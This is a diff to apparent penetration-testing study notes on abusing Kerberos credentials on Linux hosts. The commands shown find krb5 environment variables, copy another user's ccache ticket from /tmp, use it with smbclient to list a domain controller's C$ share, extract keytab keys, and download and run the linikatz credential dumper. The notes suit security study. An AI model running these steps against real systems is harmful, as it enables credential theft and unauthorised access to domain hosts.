@@ -174,10 +174,18 @@ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
 - klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work.
 - ccache files are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
 ```powershell
+
+env | grep -i krb5
+
 ls -la /tmp
+
+
 cp /tmp/krb5cc_647401106_I8I133 .
+
 export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+
 klist
+
 smbclient //dc01/C$ -k -c ls -no-pass
 ```
 
@@ -189,3 +197,5 @@ smbclient //dc01/C$ -k -c ls -no-pass
 $ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
 $ /opt/linikatz.sh
 ```
+
+
